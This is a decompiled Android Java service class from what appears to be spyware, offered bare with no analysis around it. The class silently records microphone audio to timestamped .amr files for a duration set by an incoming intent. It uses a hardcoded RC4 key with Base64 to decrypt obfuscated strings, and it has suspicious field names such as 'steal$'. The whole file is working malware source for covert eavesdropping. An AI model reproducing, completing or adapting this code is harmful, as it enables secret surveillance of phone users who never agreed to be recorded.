/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.IntentService
 *  android.content.Context
 *  android.content.Intent
 *  android.media.MediaRecorder
 *  android.util.Base64
 */
package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import com.example.mmm.service.srvRecordAudio$Runnable;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public class srvRecordAudio
extends IntentService {
    boolean version$ = false;
    utils brunei$ = new utils();
    constants exterior$ = new constants();
    String steal$;

    public srvRecordAudio() {
        super("");
    }

    public final String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    protected void onHandleIntent(Intent object) {
        int n2 = Integer.parseInt(object.getStringExtra("tick"));
        object = object.getStringExtra("name");
        if (n2 <= 0) {
            if (n2 != -1) return;
        }
        Object object2 = new SimpleDateFormat("MM-dd-yyyy_HH:mm:ss", Locale.US).format(Calendar.getInstance().getTime());
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("/");
        stringBuilder.append((String)object);
        stringBuilder.append("_");
        stringBuilder.append((String)object2);
        stringBuilder.append(".amr");
        object = stringBuilder.toString();
        object2 = new StringBuilder();
        ((StringBuilder)object2).append(this.getExternalFilesDir(null));
        ((StringBuilder)object2).append((String)object);
        this.steal$ = ((StringBuilder)object2).toString();
        object = this.brunei$;
        object2 = "FILE REC";
        stringBuilder = new StringBuilder();
        stringBuilder.append(this.steal$);
        ((utils)object).Log((String)object2, stringBuilder.toString());
        this.brunei$.Log("Time", String.valueOf(n2));
        object2 = this.steal$;
        object = new MediaRecorder();
        this.brunei$.Log("SOUND", "START RECORD SOUND");
        this.version$ = false;
        object.setAudioSource(1);
        object.setOutputFormat(3);
        object.setAudioEncoder(1);
        object.setOutputFile((String)object2);
        object2 = new Thread(new srvRecordAudio$Runnable(this, n2, (MediaRecorder)object, (String)object2, (Context)this));
        object.prepare();
        object.start();
        ((Thread)object2).start();
        this.brunei$.SettingsWrite((Context)this, "SS", "start");
    }
}

